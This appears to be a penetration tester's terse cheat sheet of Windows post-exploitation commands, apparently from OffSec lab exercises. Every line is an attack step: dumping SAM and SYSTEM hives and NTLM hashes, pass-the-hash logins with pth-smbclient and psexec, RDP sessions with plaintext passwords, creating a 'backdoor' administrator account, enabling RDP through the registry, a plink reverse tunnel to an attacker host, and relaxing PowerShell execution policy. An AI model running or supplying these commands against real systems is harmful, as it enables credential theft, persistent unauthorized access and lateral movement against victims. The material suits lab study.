reg save hklm\sam c:\sam
reg save hklm\system c:\system

samdump2 system sam
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c0e2874fb130015aec4070975e2c6071:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:d0c0896b73e0d1316aeccf93159d7ec0:::

fgdump.exe

pth-smbclient -p 4445 -U alice%aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE //127.0.0.1/c$


copied psexec.py to local folder and updated default port to the forwarded port.

python3 ./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE alice@127.0.0.1 cmd.exe

rdesktop -d xor.com -u daisy -p XorPasswordIsDead17 10.11.1.122 -r clipboard:CLIPBOARD

rdesktop -d xor.com -u daisy -p XorPasswordIsDead17 10.11.1.122 -r clipboard:CLIPBOARD -r disk:share=<path>

rdesktop 192.168.XXX.XX -u OFFSEC\\Allison -p <PASSWORD> -r disk:share=/tmp

xfreerdp --plugin rdpsnd --plugin rdpdr --data disk:home:/home -- -u cfsnspk03 10.129.3.4

xfreerdp /u:cfsnspk03 /v:10.129.3.4 /cert-ignore

xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +clipboard

### Add user
`net user backdoor backdoor123 /add`

### Add user to Administrator group
`net localgroup Administrators backdoor /add`

### Add user to remotedesktop
`net localgroup "Remote Desktop Users" backdoor /add`

### Enable RDP
`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`

python /usr/share/doc/python3-impacket/examples/psexec.py alice:ThisIsTheUsersPassword01@10.11.1.20

### adding yes answer to plink.exe command
cmd.exe /c echo y | C:\Tools\port_redirection_and_tunneling\plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4

##### Powershell

Set-ExecutionPolicy Unrestricted -Scope CurrentUser
